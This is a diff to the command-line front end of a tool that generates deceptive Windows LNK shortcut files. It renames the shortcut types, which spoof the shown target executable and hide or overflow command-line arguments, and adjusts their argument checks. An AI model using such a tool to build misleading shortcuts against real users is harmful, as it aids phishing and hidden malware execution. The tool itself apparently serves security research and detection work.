@@ -20,15 +20,15 @@ logging.getLogger().handlers[0].setFormatter(CustomFormatter())
 
 # Define supported types
 class LnkType(enum.Enum):
-    FAKE_IMAGE_PATH = (LnkWriterFakeTargetExe, "Spoof the target executable (command-line arguments will remain visible)")
-    DISABLE_NO_ARGUMENTS = (LnkWriterDisableWithoutArguments, "Disable the entire target field, only show target executable (command-line arguments are invisible)")
-    OVERFLOW = (LnkWriterOverflow, "Spoof the target executable (command-line arguments will remain visible)")
-    FAKE_IMAGE_PATH_DISABLED = (LnkWriterFakeExeDisabled, "Spoof the target executable, disable the target field (command-line arguments are invisible)")
+    SPOOFEXE_SHOWARGS_ENABLETARGET = (LnkWriterFakeTargetExe, "Spoof the target executable (command-line arguments will remain visible, target field will be enabled)")
+    REALEXE_HIDEARGS_DISABLETARGET = (LnkWriterDisableWithoutArguments, "Disable the entire target field, only show target executable (command-line arguments are invisible)")
+    SPOOFEXE_OVERFLOWARGS_DISABLETARGET = (LnkWriterOverflow, "Spoof the target executable (command-line arguments will be visually hidden, target field will be disabled) - no longer works on Windows 11 24H2 and higher")
+    SPOOFEXE_HIDEARGS_DISABLETARGET = (LnkWriterFakeExeDisabled, "Spoof the target executable (command-line arguments will be fully hidden, target field will be disabled)")
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Generate a deceptive LNK file. (C) @Wietze, 2025", formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument("lnk_type", choices=[e.name for e in LnkType], help='\n'.join(f'{e.name:<25}{e.value[-1]}' for e in LnkType))
+    parser.add_argument("lnk_type", choices=[e.name for e in LnkType], help='\n'.join(f'{e.name:<40}{e.value[-1]}' for e in LnkType))
 
     parser_target = parser.add_argument_group("LNK target")
     parser_target.add_argument("--target-executable", required=True, type=str, help="The path of the executable that should be executed.", metavar="c:\\path\\to\\file.exe")
@@ -55,7 +55,7 @@ if __name__ == '__main__':
     # Look up and execute LnkWriter subclass
     lnk_type = LnkType[opts.lnk_type]
 
-    if lnk_type == LnkType.DISABLE_NO_ARGUMENTS:
+    if lnk_type == LnkType.REALEXE_HIDEARGS_DISABLETARGET:
         if lnk_details.fake_path:
             logging.warning("argument --fake-path will be ignored for this LNK type")
     else:
@@ -63,7 +63,7 @@ if __name__ == '__main__':
             logging.error("argument --fake-path required for this LNK type")
             sys.exit(-1)
 
-    if '%' in lnk_details.target_path and lnk_type != LnkType.FAKE_IMAGE_PATH_DISABLED:
+    if '%' in lnk_details.target_path and lnk_type != LnkType.SPOOFEXE_HIDEARGS_DISABLETARGET:
         logging.error("argument --target-path cannot contain environment variables for this LNK type")
         sys.exit(-1)
 
